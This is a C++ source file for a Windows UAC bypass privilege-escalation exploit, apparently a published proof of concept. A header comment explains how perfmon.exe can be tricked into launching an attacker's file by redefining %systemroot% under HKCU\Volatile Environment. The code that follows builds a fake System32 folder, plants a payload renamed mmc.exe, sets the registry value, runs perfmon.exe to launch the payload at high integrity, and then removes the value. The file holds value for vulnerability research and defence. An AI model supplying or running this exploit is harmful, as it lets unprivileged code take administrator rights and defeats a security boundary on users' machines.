/*
 * ╓──────────────────────────────────────────────────────────────────────────────────────╖
 * ║                                                                                      ║
 * ║   Performance Monitor Volatile Environment UAC Bypass Local Privilege Escalation     ║
 * ║                                                                                      ║
 * ║   Discovered by bytecode77 (https://bytecode77.com)                                  ║
 * ║                                                                                      ║
 * ║   Full Download:                                                                     ║
 * ║   https://bytecode77.com/performance-monitor-privilege-escalation                    ║
 * ║                                                                                      ║
 * ╟──────────────────────────────────────────────────────────────────────────────────────╢
 * ║                                                                                      ║
 * ║   perfmon.exe (Performance Monitor) is an auto-elevated binary that executes         ║
 * ║   mmc.exe with the path to "perfmon.msc" as commandline argument. It is there to     ║
 * ║   auto-elevate only Performance Monitor, but the Management Console itself does      ║
 * ║   not auto-elevate.                                                                  ║
 * ║                                                                                      ║
 * ║   Now, let's take a look at the disassembly of the data section:                     ║
 * ║   ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~                     ║
 * ║                                                                                      ║
 * ║   SWC00403120___systemroot__system32_mmc_exe__:                                      ║
 * ║       unicode '"%systemroot%\system32\mmc.exe"                                       ║
 * ║       "%systemroot%\system32\perfmon.msc"',0000h                                     ║
 * ║                                                                                      ║
 * ║   This indicates, that mmc.exe will be executed from a path that contains an         ║
 * ║   environment variable (%systemroot%), thus making it vulnerable to environment      ║
 * ║   variable injection.                                                                ║
 * ║                                                                                      ║
 * ║   How to change %systemroot%?                                                        ║
 * ║   Simple: Through Volatile Environment.                                              ║
 * ║   Define your own %systemroot% in HKEY_CURRENT_USER\Volatile Environment and         ║
 * ║   perfmon.exe will look for mmc.exe there instead. This makes the exploit            ║
 * ║   particularly interesting as no DLL is required, at all. No injection, no           ║
 * ║   hijacking, we can just name our payload "mmc.exe" and it will be executed with     ║
 * ║   high IL.                                                                           ║
 * ║                                                                                      ║
 * ║   After executing perfmon.exe, our bogus "mmc.exe" is executed, which makes it       ║
 * ║   also completely independend from:                                                  ║
 * ║      - x86 or x64 bit target                                                         ║
 * ║      - Native or managed code - both can be used                                     ║
 * ║      - Basically, any other files - we might as well copy the current executable     ║
 * ║        to "mmc.exe" and re-use it this way!                                          ║
 * ║                                                                                      ║
 * ║   In this example, Payload.exe will be started, which is an exemplary payload file   ║
 * ║   displaying a MessageBox.                                                           ║
 * ║                                                                                      ║
 * ╙──────────────────────────────────────────────────────────────────────────────────────╜
 */

#include <string>
#include <Windows.h>
using namespace std;

void SetRegistryValue(HKEY key, wstring path, wstring name, wstring value);
void DeleteRegistryValue(HKEY key, wstring path, wstring name);
wstring GetTempFolderPath();
wstring GetStartupPath();

int CALLBACK WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nCmdShow)
{
	// Prepare our working directory that is later assigned to %SYSTEMROOT% through volatile environment
	wstring systemRoot = GetTempFolderPath() + L"\\PerformanceMonitorVolatileEnvironmentLPE";
	CreateDirectoryW(systemRoot.c_str(), NULL);
	CreateDirectoryW((systemRoot + L"\\System32").c_str(), NULL);

	// Copy our exemplary Payload.exe to %SYSTEMROOT%\System32\mmc.exe
	// By executing perfmon.exe later, this file will be run with high IL
	// Notably, this exploit does not require a DLL and can therefore be compiled with either one of
	// x86 or x64 and it doesn't even have to be native C++ code. All highly convenient
	CopyFileW((GetStartupPath() + L"\\Payload.exe").c_str(), (systemRoot + L"\\System32\\mmc.exe").c_str(), FALSE);

	// HKEY_CURRENT_USER\Volatile Environment\SYSTEMROOT
	// -> This registry value will redirect executions of mmc.exe to the directory we just prepared
	SetRegistryValue(HKEY_CURRENT_USER, L"Volatile Environment", L"SYSTEMROOT", systemRoot);

	// Execute perfmon.exe
	// So now, Payload.exe, aka. %SYSTEMROOT%\System32\mmc.exe is executed
	ShellExecuteW(NULL, L"open", L"perfmon.exe", NULL, NULL, SW_SHOWNORMAL);

	// Wait a little and then restore %SYSTEMROOT%
	Sleep(2000);
	DeleteRegistryValue(HKEY_CURRENT_USER, L"Volatile Environment", L"SYSTEMROOT");

	return 0;
}



void SetRegistryValue(HKEY key, wstring path, wstring name, wstring value)
{
	HKEY hKey;

	if (RegOpenKeyExW(key, path.c_str(), 0, KEY_ALL_ACCESS, &hKey) == ERROR_SUCCESS && hKey != NULL)
	{
		RegSetValueExW(hKey, name.c_str(), 0, REG_SZ, (BYTE*)value.c_str(), ((DWORD)wcslen(value.c_str()) + 1) * sizeof(wchar_t));
		RegCloseKey(hKey);
	}
}
void DeleteRegistryValue(HKEY key, wstring path, wstring name)
{
	HKEY hKey;

	if (RegOpenKeyExW(key, path.c_str(), 0, KEY_ALL_ACCESS, &hKey) == ERROR_SUCCESS && hKey != NULL)
	{
		RegDeleteValueW(hKey, name.c_str());
		RegCloseKey(hKey);
	}
}
wstring GetTempFolderPath()
{
	wchar_t path[MAX_PATH];
	GetTempPathW(MAX_PATH, path);
	return wstring(path);
}
wstring GetStartupPath()
{
	wchar_t path[MAX_PATH];
	GetModuleFileNameW(NULL, path, MAX_PATH);
	wstring pathStr = wstring(path);
	return pathStr.substr(0, pathStr.find_last_of(L"/\\"));
}